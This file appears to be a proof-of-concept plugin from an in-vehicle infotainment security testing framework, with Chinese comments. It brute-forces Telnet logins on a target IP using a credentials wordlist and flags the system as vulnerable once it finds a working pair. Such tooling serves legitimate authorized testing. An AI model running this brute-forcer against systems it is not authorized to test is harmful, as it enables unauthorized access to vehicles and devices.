"""
PoC Name: Telnet Weak Credentials
CVE: N/A
Component: Network Stack
Category: Network
Severity: Critical
CVSS: 9.8
Description: 检测IVI系统Telnet服务弱口令。由于Python 3.13已移除telnetlib,本模块采用原生socket实现基础协议交互。
Prerequisites: 目标Telnet端口(23)开放。
Usage: python3 14_Telnet_Weak_Creds.py <target_ip>
"""
import socket
import sys
import time
import os
from iv_plugin_base import IVIVulnerabilityPlugin

class TelnetWeakCredsPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def _telnet_interact(self, s, data):
        """基础的Telnet交互，处理简单的IAC协商"""
        s.sendall(data.encode('ascii') + b"\r\n")
        time.sleep(0.5)
        return s.recv(4096).decode('ascii', 'ignore')

    def exploit(self):
        port = 23
        self.logger.info(f"探测Telnet弱口令 {self.target_ip}:{port}...")
        
        # 1. 检查端口可达性
        try:
            test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_s.settimeout(3)
            if test_s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("Telnet端口23未开放")
                self.results["vulnerable"] = False
                return self.results
            test_s.close()
        except:
            self.results["vulnerable"] = False
            return self.results

        # 2. 加载字典
        wordlist_path = os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt')
        if not os.path.exists(wordlist_path):
            self.logger.error("未找到字典文件 credentials.txt")
            return self.results

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = [line.strip().split(':', 1) for line in f if ':' in line]

        # 3. 开始爆破
        self.logger.info(f"加载了 {len(credentials)} 组凭据，开始测试...")
        
        for user, passwd in credentials:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, port))
                
                # 等待登录提示符
                buffer = ""
                start_time = time.time()
                while time.time() - start_time < 5:
                    chunk = s.recv(1024).decode('ascii', 'ignore')
                    buffer += chunk
                    if any(p in buffer.lower() for p in ["login:", "username:", "user:"]):
                        break
                
                # 发送用户名
                s.sendall(user.encode('ascii') + b"\n")
                
                # 等待密码提示符
                buffer = ""
                start_time = time.time()
                while time.time() - start_time < 5:
                    chunk = s.recv(1024).decode('ascii', 'ignore')
                    buffer += chunk
                    if any(p in buffer.lower() for p in ["password:", "pass:"]):
                        break
                
                # 发送密码
                s.sendall(passwd.encode('ascii') + b"\n")
                time.sleep(1)
                
                # 检查是否成功
                final_buffer = s.recv(1024).decode('ascii', 'ignore')
                # 通常登录成功的标识
                if any(m in final_buffer for m in ["$", "#", "Welcome", "last login"]):
                    self.logger.warning(f"[+] 发现Telnet弱口令: {user} / {passwd}")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Telnet login: {user}/{passwd}"
                    s.close()
                    return self.results
                
                s.close()
            except Exception as e:
                self.logger.debug(f"测试 {user}:{passwd} 失败: {e}")
                continue

        self.logger.info("测试结束，未发现弱口令。")
        self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 14_Telnet_Weak_Creds.py <target_ip>")
        sys.exit(1)
    plugin = TelnetWeakCredsPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
